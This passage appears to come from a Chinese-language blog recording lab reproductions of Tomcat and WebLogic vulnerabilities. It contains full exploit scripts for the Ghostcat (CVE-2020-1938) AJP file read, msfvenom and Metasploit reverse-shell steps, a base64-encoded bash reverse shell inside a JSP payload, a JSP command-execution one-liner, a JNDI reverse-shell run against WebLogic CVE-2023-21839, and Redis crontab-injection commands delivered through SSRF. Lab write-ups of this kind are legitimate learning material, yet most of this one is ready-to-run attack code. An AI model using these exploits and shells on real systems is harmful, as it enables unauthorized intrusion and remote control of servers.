h_name.startswith("SC_REQ"):                                code = AjpForwardRequest.COMMON_HEADERS.index(h_name) + 1                                res += struct.pack("BB", 0xA0, code)                        else:                                res += pack_string(h_name)                        res += pack_string(self.request_headers[h_name])                return res        def pack_attributes(self):                res = b""                for attr in self.attributes:                        a_name = attr['name']                        code = AjpForwardRequest.ATTRIBUTES.index(a_name) + 1                        res += struct.pack("b", code)                        if a_name == "req_attribute":                                aa_name, a_value = attr['value']                                res += pack_string(aa_name)                                res += pack_string(a_value)                        else:                                res += pack_string(attr['value'])                res += struct.pack("B", 0xFF)                return res        def serialize(self):                res = ""                res = struct.pack("bb", self.prefix_code, self.method)                res += pack_string(self.protocol)                res += pack_string(self.req_uri)                res += pack_string(self.remote_addr)                res += pack_string(self.remote_host)                res += pack_string(self.server_name)                res += struct.pack(">h", self.server_port)                res += struct.pack("?", self.is_ssl)                res += self.pack_headers()                res += self.pack_attributes()                if self.data_direction == AjpForwardRequest.SERVER_TO_CONTAINER:                        header = struct.pack(">bbh", 0x12, 0x34, len(res))                else:                        header = struct.pack(">bbh", 0x41, 0x42, len(res))                return header + res        def parse(self, raw_packet):                stream = StringIO(raw_packet)                self.magic1, self.magic2, data_len = unpack(stream, "bbH")                self.prefix_code, self.method = unpack(stream, "bb")                self.protocol = unpack_string(stream)                self.req_uri = unpack_string(stream)                self.remote_addr = unpack_string(stream)                self.remote_host = unpack_string(stream)                self.server_name = unpack_string(stream)                self.server_port = unpack(stream, ">h")                self.is_ssl = unpack(stream, "?")                self.num_headers, = unpack(stream, ">H")                self.request_headers = {}                for i in range(self.num_headers):                        code, = unpack(stream, ">H")                        if code > 0xA000:                                h_name = AjpForwardRequest.COMMON_HEADERS[code - 0xA001]                        else:                                h_name = unpack(stream, "%ds" % code)                                stream.read(1) # \0                        h_value = unpack_string(stream)                        self.request_headers[h_name] = h_value        def send_and_receive(self, socket, stream, save_cookies=False):                res = []                i = socket.sendall(self.serialize())                if self.method == AjpForwardRequest.POST:                        return res                r = AjpResponse.receive(stream)                assert r.prefix_code == AjpResponse.SEND_HEADERS                res.append(r)                if save_cookies and 'Set-Cookie' in r.response_headers:                        self.headers['SC_REQ_COOKIE'] = r.response_headers['Set-Cookie']                # read body chunks and end response packets                while True:                        r = AjpResponse.receive(stream)                        res.append(r)                        if r.prefix_code == AjpResponse.END_RESPONSE:                                break                        elif r.prefix_code == AjpResponse.SEND_BODY_CHUNK:                                continue                        else:                                raise NotImplementedError                                break                return resclass AjpResponse(object):        _,_,_,SEND_BODY_CHUNK, SEND_HEADERS, END_RESPONSE, GET_BODY_CHUNK = range(7)        COMMON_SEND_HEADERS = [                        "Content-Type", "Content-Language", "Content-Length", "Date", "Last-Modified",                        "Location", "Set-Cookie", "Set-Cookie2", "Servlet-Engine", "Status", "WWW-Authenticate"                        ]        def parse(self, stream):                # read headers                self.magic, self.data_length, self.prefix_code = unpack(stream, ">HHb")                if self.prefix_code == AjpResponse.SEND_HEADERS:                        self.parse_send_headers(stream)                elif self.prefix_code == AjpResponse.SEND_BODY_CHUNK:                        self.parse_send_body_chunk(stream)                elif self.prefix_code == AjpResponse.END_RESPONSE:                        self.parse_end_response(stream)                elif self.prefix_code == AjpResponse.GET_BODY_CHUNK:                        self.parse_get_body_chunk(stream)                else:                        raise NotImplementedError        def parse_send_headers(self, stream):                self.http_status_code, = unpack(stream, ">H")                self.http_status_msg = unpack_string(stream)                self.num_headers, = unpack(stream, ">H")                self.response_headers = {}                for i in range(self.num_headers):                        code, = unpack(stream, ">H")                        if code <= 0xA000: # custom header                                h_name, = unpack(stream, "%ds" % code)                                stream.read(1) # \0                                h_value = unpack_string(stream)                        else:                                h_name = AjpResponse.COMMON_SEND_HEADERS[code-0xA001]                                h_value = unpack_string(stream)                        self.response_headers[h_name] = h_value        def parse_send_body_chunk(self, stream):                self.data_length, = unpack(stream, ">H")                self.data = stream.read(self.data_length+1)        def parse_end_response(self, stream):                self.reuse, = unpack(stream, "b")        def parse_get_body_chunk(self, stream):                rlen, = unpack(stream, ">H")                return rlen        @staticmethod        def receive(stream):                r = AjpResponse()                r.parse(stream)                return rimport socketdef prepare_ajp_forward_request(target_host, req_uri, method=AjpForwardRequest.GET):        fr = AjpForwardRequest(AjpForwardRequest.SERVER_TO_CONTAINER)        fr.method = method        fr.protocol = "HTTP/1.1"        fr.req_uri = req_uri        fr.remote_addr = target_host        fr.remote_host = None        fr.server_name = target_host        fr.server_port = 80        fr.request_headers = {                'SC_REQ_ACCEPT': 'text/html',                'SC_REQ_CONNECTION': 'keep-alive',                'SC_REQ_CONTENT_LENGTH': '0',                'SC_REQ_HOST': target_host,                'SC_REQ_USER_AGENT': 'Mozilla',                'Accept-Encoding': 'gzip, deflate, sdch',                'Accept-Language': 'en-US,en;q=0.5',                'Upgrade-Insecure-Requests': '1',                'Cache-Control': 'max-age=0'        }        fr.is_ssl = False        fr.attributes = []        return frclass Tomcat(object):        def __init__(self, target_host, target_port):                self.target_host = target_host                self.target_port = target_port                self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)                self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)                self.socket.connect((target_host, target_port))                self.stream = self.socket.makefile("rb", bufsize=0)        def perform_request(self, req_uri, headers={}, method='GET', user=None, password=None, attributes=[]):                self.req_uri = req_uri                self.forward_request = prepare_ajp_forward_request(self.target_host, self.req_uri, method=AjpForwardRequest.REQUEST_METHODS.get(method))                print("Getting resource at ajp13://%s:%d%s" % (self.target_host, self.target_port, req_uri))                if user is not None and password is not None:                        self.forward_request.request_headers['SC_REQ_AUTHORIZATION'] = "Basic " + ("%s:%s" % (user, password)).encode('base64').replace('\n', '')                for h in headers:                        self.forward_request.request_headers[h] = headers[h]                for a in attributes:                        self.forward_request.attributes.append(a)                responses = self.forward_request.send_and_receive(self.socket, self.stream)                if len(responses) == 0:                        return None, None                snd_hdrs_res = responses[0]                data_res = responses[1:-1]                if len(data_res) == 0:                        print("No data in response. Headers:%s\n" % snd_hdrs_res.response_headers)                return snd_hdrs_res, data_res'''javax.servlet.include.request_urijavax.servlet.include.path_infojavax.servlet.include.servlet_path'''import argparseparser = argparse.ArgumentParser()parser.add_argument("target", type=str, help="Hostname or IP to attack")parser.add_argument('-p', '--port', type=int, default=8009, help="AJP port to attack (default is 8009)")parser.add_argument("-f", '--file', type=str, default='WEB-INF/web.xml', help="file path :(WEB-INF/web.xml)")args = parser.parse_args()t = Tomcat(args.target, args.port)_,data = t.perform_request('/asdf',attributes=[    {'name':'req_attribute','value':['javax.servlet.include.request_uri','/']},    {'name':'req_attribute','value':['javax.servlet.include.path_info',args.file]},    {'name':'req_attribute','value':['javax.servlet.include.servlet_path','/']},    ])print('----------------------------')print("".join([d.data for d in data]))                                         </details><pre><code>python2 poc.py -p 8009 -f /WEB-INF/web.xml 127.0.0.1</code></pre><p>一个有意思的扩展：</p><p><a href="https://www.cnblogs.com/backlion/p/12870365.html">CVE-2020-1938 ：Apache Tomcat AJP 漏洞复现和分析 - 渗透测试中心 - 博客园</a></p><p>一个简单点的getshell：<a href="https://blog.csdn.net/m0_67844671/article/details/132829494">【网络安全—漏洞复现】Tomcat CVE-2020-1938 漏洞复现和利用过程（特详细）-CSDN博客</a></p><pre><code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.31.150 LPORT=8888 -f raw &gt; aini_shell.txt</code></pre><pre><code>docker cp aini_shell.txt 525a39f3a85e:/usr/local/tomcat/webapps/ROOT/WEB-INF/</code></pre><pre><code>use exploit/multi/handlerset payload java/jsp_shell_reverse_tcpset lhost 192.168.31.150 ## 攻击器IPset lport 4444  ## 攻击器需要监听的端口（跟生成反向shell时设置的端口一样）</code></pre><pre><code>python2 &#39;Tomcat-ROOT路径下文件包含(CVE-2020-1938).py&#39; -p 8009 -f /WEB-INF/aini_shell.txt 192.168.31.160</code></pre><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre><code>YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzIuMjAuMTAuNC85MDAxIDA+JjE= //bash -i &gt;&amp; /dev/tcp/172.20.10.4/9001 0&gt;&amp;1</code></pre><p>payload:shell.txt</p><pre><code>&lt;%Runtime.getRuntime().exec(&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzIuMjAuMTAuNC85MDAxIDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;);%&gt;</code></pre><p><a href="https://github.com/00theway/Ghostcat-CNVD-2020-10487/blob/master/ajpShooter.py">Ghostcat-CNVD-2020-10487&#x2F;ajpShooter.py at master · 00theway&#x2F;Ghostcat-CNVD-2020-10487</a></p><details>    <summary>POC_shooter.py</summary>```#!/usr/bin/python3# Author: 00thewayimport socketimport binasciiimport argparseimport urllib.parsedebug = Falsedef log(type, *args, **kwargs):    if type == 'debug' and debug == False:        return    elif type == 'append' and debug == True:        return    elif type == 'append':        kwargs['end'] = ''        print(*args, **kwargs)        return    print('[%s]' % type.upper(), *args, **kwargs)class ajpRequest(object):    def __init__(self, request_url, method='GET', headers=[], attributes=[]):        self.request_url = request_url        self.method = method        self.headers = headers        self.attributes = attributes    def method2code(self, method):        methods = {            'OPTIONS': 1,            'GET': 2,            'HEAD': 3,            'POST': 4,            'PUT': 5,            'DELETE': 6,            'TRACE': 7,            'PROPFIND': 8        }        code = methods.get(method, 2)        return code    def make_headers(self):        header2code = {            b'accept': b'\xA0\x01',  # SC_REQ_ACCEPT            b'accept-charset': b'\xA0\x02',  # SC_REQ_ACCEPT_CHARSET            b'accept-encoding': b'\xA0\x03',  # SC_REQ_ACCEPT_ENCODING            b'accept-language': b'\xA0\x04',  # SC_REQ_ACCEPT_LANGUAGE            b'authorization': b'\xA0\x05',  # SC_REQ_AUTHORIZATION            b'connection': b'\xA0\x06',  # SC_REQ_CONNECTION            b'content-type': b'\xA0\x07',  # SC_REQ_CONTENT_TYPE            b'content-length': b'\xA0\x08',  # SC_REQ_CONTENT_LENGTH            b'cookie': b'\xA0\x09',  # SC_REQ_COOKIE            b'cookie2': b'\xA0\x0A',  # SC_REQ_COOKIE2            b'host': b'\xA0\x0B',  # SC_REQ_HOST            b'pragma': b'\xA0\x0C',  # SC_REQ_PRAGMA            b'referer': b'\xA0\x0D',  # SC_REQ_REFERER            b'user-agent': b'\xA0\x0E'  # SC_REQ_USER_AGENT        }        headers_ajp = []        for (header_name, header_value) in self.headers:            code = header2code.get(header_name, b'')            if code != b'':                headers_ajp.append(code)                headers_ajp.append(self.ajp_string(header_value))            else:                headers_ajp.append(self.ajp_string(header_name))                headers_ajp.append(self.ajp_string(header_value))        return self.int2byte(len(self.headers), 2), b''.join(headers_ajp)    def make_attributes(self):        '''        org.apache.catalina.jsp_file        javax.servlet.include.servlet_path + javax.servlet.include.path_info        '''        attribute2code = {            b'remote_user': b'\x03',            b'auth_type': b'\x04',            b'query_string': b'\x05',            b'jvm_route': b'\x06',            b'ssl_cert': b'\x07',            b'ssl_cipher': b'\x08',            b'ssl_session': b'\x09',            b'req_attribute': b'\x0A',  # Name (the name of the attribut follows)            b'ssl_key_size': b'\x0B'        }        attributes_ajp = []        for (name, value) in self.attributes:            code = attribute2code.get(name, b'')            if code != b'':                attributes_ajp.append(code)                if code == b'\x0A':                    for v in value:                        attributes_ajp.append(self.ajp_string(v))                else:                    attributes_ajp.append(self.ajp_string(value))        return b''.join(attributes_ajp)    def ajp_string(self, message_bytes):        # an AJP string        # the length of the string on two bytes + string + plus two null bytes        message_len_int = len(message_bytes)        return self.int2byte(message_len_int, 2) + message_bytes + b'\x00'    def int2byte(self, data, byte_len=1):        return data.to_bytes(byte_len, 'big')    def make_forward_request_package(self):        '''        AJP13_FORWARD_REQUEST :=            prefix_code      (byte) 0x02 = JK_AJP13_FORWARD_REQUEST            method           (byte)            protocol         (string)            req_uri          (string)            remote_addr      (string)            remote_host      (string)            server_name      (string)            server_port      (integer)            is_ssl           (boolean)            num_headers      (integer)            request_headers *(req_header_name req_header_value)            attributes      *(attribut_name attribute_value)            request_terminator (byte) OxFF        '''        req_ob = urllib.parse.urlparse(self.request_url)        # JK_AJP13_FORWARD_REQUEST        prefix_code_int = 2        prefix_code_bytes = self.int2byte(prefix_code_int)        method_bytes = self.int2byte(self.method2code(self.method))        protocol_bytes = b'HTTP/1.1'        req_uri_bytes = req_ob.path.encode('utf8')        remote_addr_bytes = b'127.0.0.1'        remote_host_bytes = b'localhost'        server_name_bytes = req_ob.hostname.encode('utf8')        # SSL flag        if req_ob.scheme == 'https':            is_ssl_boolean = 1        else:            is_ssl_boolean = 0        # port        server_port_int = req_ob.port        if not server_port_int:            server_port_int = (is_ssl_boolean ^ 1) * 80 + (is_ssl_boolean ^ 0) * 443        server_port_bytes = self.int2byte(server_port_int, 2)  # convert to a two bytes        is_ssl_bytes = self.int2byte(is_ssl_boolean)  # convert to a one byte        self.headers.append((b'host', b'%s:%d' % (server_name_bytes, server_port_int)))        num_headers_bytes, headers_ajp_bytes = self.make_headers()        attributes_ajp_bytes = self.make_attributes()        message = []        message.append(prefix_code_bytes)        message.append(method_bytes)        message.append(self.ajp_string(protocol_bytes))        message.append(self.ajp_string(req_uri_bytes))        message.append(self.ajp_string(remote_addr_bytes))        message.append(self.ajp_string(remote_host_bytes))        message.append(self.ajp_string(server_name_bytes))        message.append(server_port_bytes)        message.append(is_ssl_bytes)        message.append(num_headers_bytes)        message.append(headers_ajp_bytes)        message.append(attributes_ajp_bytes)        message.append(b'\xff')        message_bytes = b''.join(message)        send_bytes = b'\x12\x34' + self.ajp_string(message_bytes)        return send_bytesclass ajpResponse(object):    def __init__(self, s, out_file):        self.sock = s        self.out_file = out_file        self.body_start = False        self.common_response_headers = {            b'\x01': b'Content-Type',            b'\x02': b'Content-Language',            b'\x03': b'Content-Length',            b'\x04': b'Date',            b'\x05': b'Last-Modified',            b'\x06': b'Location',            b'\x07': b'Set-Cookie',            b'\x08': b'Set-Cookie2',            b'\x09': b'Servlet-Engine',            b'\x0a': b'Status',            b'\x0b': b'WWW-Authenticate',        }        if not self.out_file:            self.out_file = False        else:            log('*', 'store response in %s' % self.out_file)            self.out = open(self.out_file, 'wb')    def parse_response(self):        log('debug', 'start')        magic = self.recv(2)  # first two bytes are the 'magic'        log('debug', 'magic', magic, binascii.b2a_hex(magic))        # next two bytes are the length        data_len_int = self.read_int(2)        code_int = self.read_int(1)        log('debug', 'code', code_int)        if code_int == 3:            self.parse_send_body_chunk()        elif code_int == 4:            self.parse_headers()        elif code_int == 5:            self.parse_response_end()            quit()        self.parse_response()    def parse_headers(self):        log("append", '\n')        log('debug', 'parsing RESPONSE HEADERS')        status_int = self.read_int(2)        msg_bytes = self.read_string()        log('<', status_int, msg_bytes.decode('utf8'))        headers_number_int = self.read_int(2)        log('debug', 'headers_nb', headers_number_int)        for i in range(headers_number_int):            # header name: two cases            first_byte = self.recv(1)            second_byte = self.recv(1)            if first_byte == b'\xa0':                header_key_bytes = self.common_response_headers[second_byte]            else:                header_len_bytes = first_byte + second_byte                header_len_int = int.from_bytes(header_len_bytes, byteorder='big')                header_key_bytes = self.read_bytes(header_len_int)                # consume the 0x00 terminator                self.recv(1)            header_value_bytes = self.read_string()            try:                header_key_bytes = header_key_bytes.decode('utf8')                header_value_bytes = header_value_bytes.decode('utf8')            except:                pass            log('<', '%s: %s' % (header_key_bytes, header_value_bytes))    def parse_send_body_chunk(self):        if not self.body_start:            log('append', '\n')            log('debug', 'start parsing body chunk')            self.body_start = True        chunk = self.read_string()        if self.out_file:            self.out.write(chunk)        else:            try:                chunk = chunk.decode('utf8')            except:                pass            log('append', chunk)    def parse_response_end(self):        log('debug', 'start parsing end')        code_reuse_int = self.read_int(1)        log('debug', "finish parsing end", code_reuse_int)        self.sock.close()    def read_int(self, int_len):        return int.from_bytes(self.recv(int_len), byteorder='big')    def read_bytes(self, bytes_len):        return self.recv(bytes_len)    def read_string(self, int_len=2):        data_len = self.read_int(int_len)        data = self.recv(data_len)        # consume the 0x00 terminator        end = self.recv(1)        log('debug', 'read_string read data_len:%d\ndata_len:%d\nend:%s' % (data_len, len(data), end))        return data    def recv(self, data_len):        data = self.sock.recv(data_len)        while len(data) < data_len:            log('debug', 'recv not end,wait for %d bytes' % (data_len - len(data)))            data += self.sock.recv(data_len - len(data))        return dataclass ajpShooter(object):    def __init__(self, args):        self.args = args        self.headers = args.header        self.ajp_port = args.ajp_port        self.requesturl = args.url        self.target_file = args.target_file        self.shooter = args.shooter        self.method = args.X        self.out_file = args.out_file    def shoot(self):        headers = self.transform_headers()        target_file = self.target_file.encode('utf8')        attributes = []        evil_req_attributes = [            (b'javax.servlet.include.request_uri', b'index'),            (b'javax.servlet.include.servlet_path', target_file)        ]        for req_attr in evil_req_attributes:            attributes.append((b"req_attribute", req_attr))        if self.shooter == 'read':            self.requesturl += '/index.txt'        else:            self.requesturl += '/index.jsp'        ajp_ip = urllib.parse.urlparse(self.requesturl).hostname        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)        s.connect((ajp_ip, self.ajp_port))        message = ajpRequest(self.requesturl, self.method, headers, attributes).make_forward_request_package()        s.send(message)        ajpResponse(s, self.out_file).parse_response()    def transform_headers(self):        self.headers = [] if not self.headers else self.headers        newheaders = []        for header in self.headers:            hsplit = header.split(':')            hname = hsplit[0]            hvalue = ':'.join(hsplit[1:])            newheaders.append((hname.lower().encode('utf8'), hvalue.encode('utf8')))        return newheadersif __name__ == "__main__":    # parse command line arguments    print('''       _    _         __ _                 _                  /_\  (_)_ __   / _\ |__   ___   ___ | |_ ___ _ __      //_\\\\ | | '_ \  \ \| '_ \ / _ \ / _ \| __/ _ \ '__|    /  _  \| | |_) | _\ \ | | | (_) | (_) | ||  __/ |       \_/ \_// | .__/  \__/_| |_|\___/ \___/ \__\___|_|            |__/|_|                                                                                        00theway,just for test    ''')    parser = argparse.ArgumentParser()    parser.add_argument('url', help='target site\'s context root url like http://www.example.com/demo/')    parser.add_argument('ajp_port', default=8009, type=int, help='ajp port')    parser.add_argument('target_file', help='target file to read or eval like /WEB-INF/web.xml,/image/evil.jpg')    parser.add_argument('shooter', choices=['read', 'eval'], help='read or eval file')    parser.add_argument('--ajp-ip', help='ajp server ip,default value will parse from from url')    parser.add_argument('-H', '--header', help='add a header', action='append')    parser.add_argument('-X', help='Sets the method (default: %(default)s).', default='GET',                        choices=['GET', 'POST', 'HEAD', 'OPTIONS', 'PROPFIND'])    parser.add_argument('-d', '--data', nargs=1, help='The data to POST')    parser.add_argument('-o', '--out-file', help='write response to file')    parser.add_argument('--debug', action='store_true', default=False)    args = parser.parse_args()    debug = args.debug    ajpShooter(args).shoot()                                   ```                                   </details><blockquote><p>&#x2F;&#x2F; 去除代码空行</p><p>在 Kali Linux 中，你可以使用以下几种方法来去除脚本中的空行：</p><h3 id="方法-1：使用-sed"><a href="#方法-1：使用-sed" class="headerlink" title="方法 1：使用 sed"></a>方法 1：使用 <code>sed</code></h3><pre><code>bash复制代码sed &#39;/^$/d&#39; your_script.sh &gt; output_script.sh</code></pre><ul><li>这条命令会删除空行并将结果输出到 <code>output_script.sh</code> 文件中。</li></ul><h3 id="方法-2：使用-grep"><a href="#方法-2：使用-grep" class="headerlink" title="方法 2：使用 grep"></a>方法 2：使用 <code>grep</code></h3><pre><code>bash复制代码grep -v &#39;^$&#39; your_script.sh &gt; output_script.sh</code></pre><ul><li><code>grep -v &#39;^$&#39;</code> 会过滤掉所有空行，将非空行保存到 <code>output_script.sh</code>。</li></ul><h3 id="方法-3：使用-awk"><a href="#方法-3：使用-awk" class="headerlink" title="方法 3：使用 awk"></a>方法 3：使用 <code>awk</code></h3><pre><code>bash复制代码awk &#39;NF&#39; your_script.sh &gt; output_script.sh</code></pre><ul><li>这条命令会只保留包含内容的行（非空行），并输出到新的文件。</li></ul></blockquote><p>也可以上传一句话命令执行文件exec.txt(里面的系统命令可以根据需要修改）</p><p>exec.txt内容如下：</p><pre><code>&lt;%out.println(new java.io.BufferedReader(new java.io.InputStreamReader(Runtime.getRuntime().exec(&quot;whoami&quot;).getInputStream())).readLine());%&gt;</code></pre><p>后续再跟进一下触发过程和代码，相当于学习代码审计了。</p><p><a href="https://www.cnblogs.com/backlion/p/12870365.html">CVE-2020-1938 ：Apache Tomcat AJP 漏洞复现和分析 - 渗透测试中心 - 博客园</a></p><h2 id="Tomcat8-（war）"><a href="#Tomcat8-（war）" class="headerlink" title="Tomcat8 （war）"></a>Tomcat8 （war）</h2><p>这个应该是很老的一个漏洞，需要管理员账户。</p><p>只是需要注意文件上传成功后，默认会在网站根目录下生成和war包名称一致的目录，我的压缩文件名为<code>shell.jsp.war</code>,则要到<code>/shell.jsp</code>目录下访问<code>shell.jsp</code></p><pre><code>http://127.0.0.1:8080/shell.jsp/shell.jsp</code></pre><h1 id="Weblogic"><a href="#Weblogic" class="headerlink" title="Weblogic"></a>Weblogic</h1><h2 id="CVE-2023-21839"><a href="#CVE-2023-21839" class="headerlink" title="CVE-2023-21839"></a>CVE-2023-21839</h2><p>CVE-2023-21839 允许远程用户在未经授权的情况下通过 IIOP&#x2F;T3 进行 JNDI lookup 操作，当 JDK 版本过低或本地存在小工具（javaSerializedData）时，这可能会导致 RCE 漏洞</p><p><a href="https://www.cnblogs.com/BlogVice-2203/p/17454727.html">Weblogic反序列化（CVE-2023-21839）漏洞复现 - Vice_2203 - 博客园</a></p><p><a href="https://www.freebuf.com/vuls/364212.html">Weblogic CVE 2023-21839漏洞复现 - FreeBuf网络安全行业门户</a></p><p>如果不适用工具包的话环境还比较麻烦，这里使用工具复现一下：</p><p>首先要启动一个ldap服务器：</p><p>tool：JNDI利用工具</p><pre><code>E:\BaiduNetdiskDownload\ONE-FOX集成工具箱_V6公开版_by狐狸\gui_scan\jndi&gt;java -jar JNDIExploit-2.0-SNAPSHOT.jarError: The following option is required: [-i | --ip]Usage: java -jar  MYJNDIExploit1.1.jar [options]  Options:  * -i, --ip       Local ip address    -l, --ldapPort Ldap bind port (default: 1389)    -p, --httpPort Http bind port (default: 8080)    -u, --usage    Show usage (default: false)    -h, --help     Show this help    -o, --output   out put fileE:\BaiduNetdiskDownload\ONE-FOX集成工具箱_V6公开版_by狐狸\gui_scan\jndi&gt;java -jar JNDIExploit-2.0-SNAPSHOT.jar -i 192.168.1.105[+] LDAP Server Start Listening on 1389...[+] HTTP Server Start Listening on 8080...</code></pre><p>启动监听：</p><pre><code>//kali  : 192.168.1.102nc -lvnp 9001</code></pre><blockquote><p>此时使用攻击机B执行exp</p><p>java -jar Weblogic-CVE-2023-21839.jar 靶场 IP:7001 ldap:&#x2F;&#x2F;ldap服务器IP:1389&#x2F;Basic&#x2F;ReverseShell&#x2F;ldap服务器IP&#x2F;nc监听端口</p></blockquote><pre><code># java -jar Weblogic-CVE-2023-21839.jar 127.0.0.1:7001 ldap://192.168.1.102:1389/Basic/ReverseShell/192.168.1.102/9001Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true</code></pre><blockquote><p>切换Java：<a href="https://blog.csdn.net/huayimy/article/details/130273362">Kali安装JAVA8和切换JDK版本的详细过程_kali安装jdk8-CSDN博客</a></p><p>这里有个逆天的地方：</p><p>Java 1.8 不支持 <code>--version</code> 选项。相反，可以使用 <code>java -version</code> 来查看安装的 Java 版本</p></blockquote><p>但是卡住了：</p><pre><code>─# java -jar JNDIExploit-2.0-SNAPSHOT.jar -i 127.0.0.1 -p 3322Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true[+] LDAP Server Start Listening on 1389...[+] HTTP Server Start Listening on 3322...[+] Received LDAP Query: Basic/ReverseShell/192.168.1.102/9001[+] Payload: reverseshell[+] IP: 192.168.1.102[+] Port: 9001[+] Sending LDAP ResourceRef result for Basic/ReverseShell/192.168.1.102/9001 with basic remote reference payload[+] Send LDAP reference result for Basic/ReverseShell/192.168.1.102/9001 redirecting to http://127.0.0.1:3322/Exploitp7e3ex3jCE.class</code></pre><p>找了很久，发现是<code>jndi</code>服务器的ip不能填<code>0.0.0.0</code>或者<code>127.0.0.1</code></p><pre><code>└─# nc -lvvp 9001listening on [any] 9001 ...172.21.0.2: inverse host lookup failed: Unknown hostconnect to [192.168.1.102] from (UNKNOWN) [172.21.0.2] 39840bash: no job control in this shell[oracle@304fd45a9ef2 base_domain]$ </code></pre><h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><p>常规：</p><p>访问<code>http://your-ip:7001/uddiexplorer/</code></p><blockquote><p><code>UDDIExplorer</code> 是 WebLogic Server 提供的一个基于 Web 的用户界面，用于访问和管理 UDDI（Universal Description, Discovery, and Integration，通用描述、发现和集成）注册服务。UDDI 是一种用于发布和发现 Web 服务的标准协议，通常用于企业内部或跨企业环境中查找可重用的 Web 服务。</p></blockquote><p>访问然后抓包：</p><pre><code>POST /uddiexplorer/SearchPublicRegistries.jsp HTTP/1.1Host: 127.0.0.1:7001User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencodedContent-Length: 143Origin: http://127.0.0.1:7001Connection: closeReferer: http://127.0.0.1:7001/uddiexplorer/SearchPublicRegistries.jspCookie: publicinquiryurls=http://www-3.ibm.com/services/uddi/inquiryapi!IBM|http://www-3.ibm.com/services/uddi/v2beta/inquiryapi!IBM V2|http://uddi.rte.microsoft.com/inquire!Microsoft|http://services.xmethods.net/glue/inquire/uddi!XMethods|; ADMINCONSOLESESSION=W72vnxyTy6QH2gDChznw8KcfQvwBX2tbPMcJrfp2xWd2jGv397XL!-1328809793; JSESSIONID=y21nnx1VvJC7nWZwt1jFYXTfTnhtsM1YLLHSkg3S15G67pGKLwPv!-1328809793Upgrade-Insecure-Requests: 1Sec-Fetch-Dest: documentSec-Fetch-Mode: navigateSec-Fetch-Site: same-originSec-Fetch-User: ?1operator=http%3A%2F%2F172.20.10.4%3a8000&amp;rdoSearch=name&amp;txtSearchname=123&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search</code></pre><p>把<code>operator</code>的参数修改为目标网址可以触发ssrf（需要编码特殊符号）</p><blockquote><p>可访问的端口将会得到错误，一般是返回status code（如下图），如果访问的非http协议，则会返回<code>did not have a valid SOAP content-type</code>。</p></blockquote><blockquote><p>修改为一个不存在的端口，将会返回<code>could not connect over HTTP to server</code>。</p></blockquote><p>原shell：</p><pre><code>set 1 &quot;\n\n\n\n0-59 0-23 1-31 1-12 0-6 root bash -c &#39;sh -i &gt;&amp; /dev/tcp/evil/21 0&gt;&amp;1&#39;\n\n\n\n&quot;config set dir /etc/config set dbfilename crontabsave</code></pre><blockquote><p>GPT:</p><p>这是一组利用 Redis 配置文件创建恶意计划任务的命令。下面逐行解释每个命令的作用：</p><ol><li><p><code>set 1 &quot;\n\n\n\n0-59 0-23 1-31 1-12 0-6 root bash -c &#39;sh -i &gt;&amp; /dev/tcp/evil/21 0&gt;&amp;1&#39;\n\n\n\n&quot;</code></p><ul><li><p>使用 Redis <code>SET</code> 命令将一个字符串写入 Redis 数据库中。这个字符串构造了一个恶意的 Cron 计划任务。</p></li><li><p>该任务设置为每分钟运行一次，命令内容是打开一个反向 shell 连接，即连接到 <code>evil</code> 服务器的 21 端口。这种连接通常用于未授权的远程访问。</p></li></ul></li><li><p><code>config set dir /etc/</code></p><ul><li><p>设置 Redis 的工作目录为 <code>/etc/</code>，即将 Redis 数据库文件的保存路径指定为系统目录 <code>/etc/</code>。</p></li><li><p>这个操作目的是将 Redis 数据库文件保存到系统的 Cron 配置目录中，以便后续在 <code>/etc/crontab</code> 中创建恶意的计划任务。</p></li></ul></li><li><p><code>config set dbfilename crontab</code></p><ul><li><p>将 Redis 的数据库文件名设置为 <code>crontab</code>，即指定 Redis 将数据保存为 <code>/etc/crontab</code> 文件。</p></li><li><p><code>/etc/crontab</code> 是 Linux 系统中的计划任务文件，操作系统会定期读取该文件并执行其中的任务。</p></li></ul></li><li><p><code>save</code></p><ul><li><p>强制 Redis 将数据保存到磁盘中，此时 Redis 将会把包含恶意计划任务的内容写入 <code>/etc/crontab</code> 文件。</p></li><li><p>一旦保存成功，操作系统会读取 <code>/etc/crontab</code> 文件中的新任务，定期执行恶意计划任务。</p></li></ul></li></ol></blockquote><p>然后进行url编码：</p><pre><code>php -r &quot;echo urlencode(&#39;要编码的字符串&#39;);&quot;</code></pre><p>注意，换行符是“\r\n”，也就是“%0D%0A”。</p><p>这里我的redis容器无法启动，先跳过</p><blockquote><ul><li>&#x2F;etc&#x2F;crontab 这个是肯定的</li><li>&#x2F;etc&#x2F;cron.d&#x2F;* 将任意文件写到该目录下，效果和crontab相同，格式也要和&#x2F;etc&#x2F;crontab相同。漏洞利用这个目录，可以做到不覆盖任何其他文件的情况进行弹shell。</li><li>&#x2F;var&#x2F;spool&#x2F;cron&#x2F;root centos系统下root用户的cron文件</li><li>&#x2F;var&#x2F;spool&#x2F;cron&#x2F;crontabs&#x2F;root debian系统下root用户的cron文件</li></ul></blockquote><h2 id="weak-passwd"><a href="#weak-passwd" class="headerlink" title="weak_passwd"></a>weak_passwd</h2><ul><li>弱口令进入后台</li></ul><p>weblogic常用弱口令： <a href="http://cirt.net/passwords?criteria=weblogic">http://cirt.net/passwords?criteria=weblogic</a></p><ul><li>任意文件读取漏洞获取密码</li></ul><h3 id="读取后台用户密文与密钥文件"><a href="#读取后台用户密文与密钥文件" class="headerlink" 